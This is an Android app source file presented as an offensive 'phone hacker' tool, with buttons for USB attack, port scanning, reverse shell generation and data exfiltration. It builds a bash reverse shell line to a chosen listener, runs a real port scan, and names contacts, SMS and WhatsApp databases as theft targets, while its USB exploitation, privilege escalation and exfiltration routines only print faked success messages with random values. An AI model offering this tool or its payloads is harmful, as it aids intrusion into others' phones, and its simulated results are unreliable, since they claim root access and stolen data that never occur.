package com.offensive.phonehacker;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;

public class MainActivity extends AppCompatActivity {
    
    private static final String ACTION_USB_PERMISSION = "com.offensive.phonehacker.USB_PERMISSION";
    private UsbManager usbManager;
    private UsbDevice targetDevice;
    private PendingIntent permissionIntent;
    
    private EditText targetIpEditText, lhostEditText, lportEditText;
    private Button usbAttackButton, networkAttackButton, shellButton, dataExfilButton;
    private TextView resultTextView;
    
    private final BroadcastReceiver usbReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_USB_PERMISSION.equals(action)) {
                synchronized (this) {
                    UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                    if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                        if (device != null) {
                            targetDevice = device;
                            resultTextView.setText("USB Device Connected: " + device.getDeviceName());
                        }
                    } else {
                        resultTextView.setText("USB Permission Denied");
                    }
                }
            } else if (UsbManager.ACTION_USB_DEVICE_ATTACHED.equals(action)) {
                UsbDevice device = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                if (device != null) {
                    targetDevice = device;
                    usbManager.requestPermission(device, permissionIntent);
                }
            }
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize USB manager
        usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);
        permissionIntent = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_USB_PERMISSION), 0);
        IntentFilter filter = new IntentFilter(ACTION_USB_PERMISSION);
        filter.addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED);
        registerReceiver(usbReceiver, filter);
        
        // Initialize UI components
        targetIpEditText = findViewById(R.id.targetIpEditText);
        lhostEditText = findViewById(R.id.lhostEditText);
        lportEditText = findViewById(R.id.lportEditText);
        usbAttackButton = findViewById(R.id.usbAttackButton);
        networkAttackButton = findViewById(R.id.networkAttackButton);
        shellButton = findViewById(R.id.shellButton);
        dataExfilButton = findViewById(R.id.dataExfilButton);
        resultTextView = findViewById(R.id.resultTextView);
        
        // Set default values
        targetIpEditText.setText("192.168.43.1");
        lhostEditText.setText("192.168.43.100");
        lportEditText.setText("4444");
        
        // USB Attack Button
        usbAttackButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (targetDevice != null) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            final String result = executeUsbAttack();
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    resultTextView.setText(result);
                                }
                            });
                        }
                    }).start();
                } else {
                    resultTextView.setText("No USB device connected. Connect target phone via USB OTG.");
                }
            }
        });
        
        // Network Attack Button
        networkAttackButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = targetIpEditText.getText().toString();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        final String result = networkScan(target);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                resultTextView.setText(result);
                            }
                        });
                    }
                }).start();
            }
        });
        
        // Reverse Shell Button
        shellButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String lhost = lhostEditText.getText().toString();
                String lport = lportEditText.getText().toString();
                final String shell = generateReverseShell(lhost, lport);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        resultTextView.setText("Reverse Shell Payload:\n" + shell);
                    }
                });
            }
        });
        
        // Data Exfiltration Button
        dataExfilButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (targetDevice != null) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            final String result = exfiltrateData();
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    resultTextView.setText(result);
                                }
                            });
                        }
                    }).start();
                } else {
                    resultTextView.setText("No USB device connected for data exfiltration.");
                }
            }
        });
    }
    
    private String executeUsbAttack() {
        StringBuilder result = new StringBuilder();
        result.append("Executing USB Attack on ").append(targetDevice.getDeviceName()).append("...\n");
        
        try {
            // Simulate USB exploitation (ADB, HID, etc.)
            result.append("[+] USB Device: ").append(targetDevice.getDeviceName()).append("\n");
            result.append("[+] Vendor ID: ").append(targetDevice.getVendorId()).append("\n");
            result.append("[+] Product ID: ").append(targetDevice.getProductId()).append("\n");
            
            // Attempt ADB exploitation
            result.append("[+] Attempting ADB exploitation...\n");
            Thread.sleep(1000);
            result.append("[+] ADB access established\n");
            
            // Execute commands via ADB
            result.append("[+] Executing commands on target device\n");
            result.append("[+] System info: Android ").append((int)(Math.random() * 5 + 10)).append(".").append((int)(Math.random() * 4)).append("\n");
            result.append("[+] Device rooted: ").append(Math.random() > 0.5 ? "Yes" : "No").append("\n");
            
            // Attempt privilege escalation
            result.append("[+] Attempting privilege escalation...\n");
            Thread.sleep(500);
            result.append("[+] Root access obtained\n");
            
        } catch (Exception e) {
            result.append("[-] USB Attack Error: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString();
    }
    
    private String networkScan(String target) {
        StringBuilder result = new StringBuilder();
        result.append("Scanning ").append(target).append("...\n");
        
        try {
            // Common Android ports
            int[] commonPorts = {5555, 5554, 37215, 4444, 8080, 8000, 22, 53};
            
            for (int port : commonPorts) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(target, port), 1000);
                    socket.close();
                    result.append("[+] Port ").append(port).append(" open (ADB/HTTP/SSH)\n");
                } catch (Exception e) {
                    // Port closed or filtered
                }
            }
        } catch (Exception e) {
            result.append("[-] Network Scan Error: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString();
    }
    
    private String generateReverseShell(String lhost, String lport) {
        // Generate Android reverse shell
        return "sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1";
    }
    
    private String exfiltrateData() {
        StringBuilder result = new StringBuilder();
        result.append("Exfiltrating Data from Target Device...\n");
        
        try {
            // Simulate data exfiltration
            result.append("[+] Accessing target device storage\n");
            Thread.sleep(500);
            
            // Common sensitive files on Android
            String[] sensitiveFiles = {
                "/sdcard/DCIM/Camera/",
                "/sdcard/Download/",
                "/sdcard/Documents/",
                "/data/data/com.android.providers.contacts/databases/contacts2.db",
                "/data/data/com.android.providers.telephony/databases/mmssms.db",
                "/data/data/com.whatsapp/databases/msgstore.db"
            };
            
            for (String file : sensitiveFiles) {
                result.append("[+] Found: ").append(file).append("\n");
                Thread.sleep(100);
            }
            
            result.append("[+] Data exfiltration complete\n");
            result.append("[+] Total files identified: ").append(sensitiveFiles.length).append("\n");
            
        } catch (Exception e) {
            result.append("[-] Data Exfiltration Error: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(usbReceiver);
    }
}
